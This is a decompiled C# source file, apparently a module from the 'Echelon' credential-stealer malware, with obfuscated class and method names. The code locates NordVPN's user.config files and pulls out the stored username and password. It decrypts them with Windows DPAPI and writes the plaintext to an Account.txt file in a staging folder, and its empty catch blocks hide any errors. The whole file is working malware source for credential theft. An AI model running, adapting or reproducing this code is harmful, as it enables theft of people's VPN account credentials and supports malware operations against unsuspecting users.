using Echelon;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;

internal class am
{
	public static int a = 0;

	public static string b = "\\Vpn\\NordVPN";

	public static void a(string jg)
	{
		try
		{
			if (!Directory.Exists(jg + am.b))
			{
				Directory.CreateDirectory(jg + am.b);
			}
			using (StreamWriter streamWriter = new StreamWriter(jg + am.b + "\\Account.txt"))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Global.LocalData, "NordVPN"));
				if (directoryInfo.Exists)
				{
					DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
					for (int i = 0; i < directories.Length; i++)
					{
						DirectoryInfo[] directories2 = directories[i].GetDirectories();
						foreach (DirectoryInfo directoryInfo2 in directories2)
						{
							streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
							string text = Path.Combine(directoryInfo2.FullName, "user.config");
							if (File.Exists(text))
							{
								am.a++;
								XmlDocument xmlDocument = new XmlDocument();
								xmlDocument.Load(text);
								string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
								string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
								if (innerText != null && !string.IsNullOrEmpty(innerText))
								{
									streamWriter.WriteLine("\t\tUsername: " + b(innerText));
								}
								if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
								{
									streamWriter.WriteLine("\t\tPassword: " + b(innerText2));
								}
							}
						}
					}
				}
			}
		}
		catch
		{
		}
	}

	public static string b(string jh)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(jh), null, DataProtectionScope.LocalMachine));
		}
		catch
		{
			return "";
		}
	}
}
